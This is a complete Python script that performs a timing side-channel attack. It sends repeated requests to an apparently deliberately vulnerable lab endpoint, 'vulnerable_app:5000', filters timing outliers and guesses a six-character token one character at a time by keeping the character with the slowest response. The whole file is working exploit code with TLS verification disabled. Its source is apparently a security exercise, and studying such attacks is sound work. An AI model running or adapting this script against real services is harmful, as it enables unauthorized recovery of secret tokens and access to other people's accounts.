import statistics
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def test_token_single(url, token):
    start = time.perf_counter_ns()
    try:
        r = requests.get(url, params={"token": token}, verify=False, timeout=5)
        duration = time.perf_counter_ns() - start
        return duration
    except:
        return None

def test_token(url, token, num_requests=100):
    times = [] # i sampled a token multiple times in an attempt to mitigate network errors
    for _ in range(num_requests):
        result = test_token_single(url, token)
        if result is not None:
            times.append(result)
    
    if not times:
        return 0
        
    # Remove outliers
    q1 = statistics.quantiles(times, n=4)[0]
    q3 = statistics.quantiles(times, n=4)[2]
    iqr = q3 - q1
    filtered = [t for t in times if q1 - 1.5*iqr <= t <= q3 + 1.5*iqr]
    
    return statistics.median(filtered) if filtered else 0

def main():
    url = "http://vulnerable_app:5000/api/123"
    charset = "abcdefghijklmnopqrstuvwxyz"
    token_length = 6

    current_guess = ['0'] * (token_length)
    
    # Now guess remaining positions
    for i in range(0, token_length):  # Start from position 1
        best_char = None
        best_time = 0
        
        print(f"\nTesting position {i}...")
        for ch in charset:
            current_guess[i] = ch
            guess_str = "".join(current_guess)
            
            avg_time = test_token(url, guess_str)
            print(f"  Testing '{ch}': {avg_time/1e6:.3f}ms")
            
            if avg_time > best_time:
                best_time = avg_time
                best_char = ch
        
        current_guess[i] = best_char
        print(f"Best char at position {i} is '{best_char}' ({best_time/1e6:.3f}ms)")
        print(f"Current guess: {''.join(current_guess)}")

    print(f"\nFinal token guess: {''.join(current_guess)}")

if __name__ == "__main__":
    main()